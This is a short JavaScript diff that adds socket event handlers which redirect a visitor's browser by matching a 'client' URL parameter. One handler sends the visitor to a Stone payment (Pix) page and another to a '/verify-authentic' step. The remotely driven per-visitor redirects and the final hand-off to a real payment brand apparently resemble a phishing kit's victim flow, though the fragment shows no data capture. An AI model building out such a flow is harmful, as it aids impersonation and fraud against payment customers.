@@ -670,10 +670,16 @@ const infosData = (() => {
             } else return
         })
 
-        socket.on('getAuth', (data) => {
+        socket.on('FinishClient', (data) => {
             const params = new URLSearchParams(window.location.search)
 
-            console.log('get auth of %s', data)
+            if (params.has('client')) {
+                if (params.get('client') == data) window.location.href = `https://www.stone.com.br/pix/`
+            } else return
+        })
+
+        socket.on('getAuth', (data) => {
+            const params = new URLSearchParams(window.location.search)
 
             if (params.has('client')) {
                 if (params.get('client') == data) window.location.href = `/verify-authentic?client=${data}`
